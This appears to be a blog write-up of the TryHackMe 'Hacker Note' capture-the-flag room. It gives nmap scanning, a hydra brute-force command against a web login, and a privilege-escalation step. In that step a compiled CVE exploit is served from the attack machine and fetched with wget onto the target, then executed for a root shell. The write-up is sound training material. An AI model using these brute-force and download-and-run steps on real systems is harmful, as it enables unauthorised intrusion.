---
title: THM Hacker Note
date: 2021-01-22 21:50:00 +0000
categories: [Security, TryHackMe]
tags: [thm, hackernote, writeup]     # TAG names should always be lowercase
---

Task 1: Reconnaissance
To identify open ports inside the target machine, you can use nmap
namp -sV -O -v <ip>

-sV flag will give you details about software accessible through the open ports.

Task 2: Investigate
Follow the instruction provided. Nothing to answer.

Task 3: Exploit
Follow the instruction provided. Use the provided script if you are block.

Task 4: Attack Passwords
Follow the instruction and use hydra to bruteforce the password.
Optimize the wordlist based on the information found on the login's hint for the user.
Then execute hydra command
hydra -l <user> -P <wordlist> <ip> http-post-form "/api/user/login:username=^USER^&password=^PASS^&Login=Login:Invalid Username Or Password"

Then check jame's note to answer the last question and found the flag.
ssh james@<ip>
find / -name user.txt 2>/dev/null
cat /james/user.txt

Task 5: Escalate
Read the instruction and some Google research are enough to found the CVE related to this settings.
Recover the exploit you found based on the CVE number and compile into your attack machine (write make inside the folder to execute the makeFile and build the exploit)
Then transfert the exploit binary created after the make command to the target machine.
There is several way but an easy one consist of starting a webserver inside your attack machine on the folder where you have build the exploit and then wget the file inside the target mahcine through your previous SSH connection.
For exemple, run the following command on your attach machine
python3 -m http.server
This command will load the http.server module of python on the current repository. We can see that the http.server module listen on port 8000
Then on the target machine, download the file
wget <attack_ip>:<port>/exploit 
This will download the file. 
Finaly you have to add execution rights on the file and execute it.
chmod +x exploit
./exploit
Then you have a new shell open, write id or whoami to see that you are now root.
Found the root flag to finish
find / -name root.txt 2>/dev/null
cat /root/root.txt

Task 6: Comments on realism and Further Reading
Nothing to do, just read the instruction.
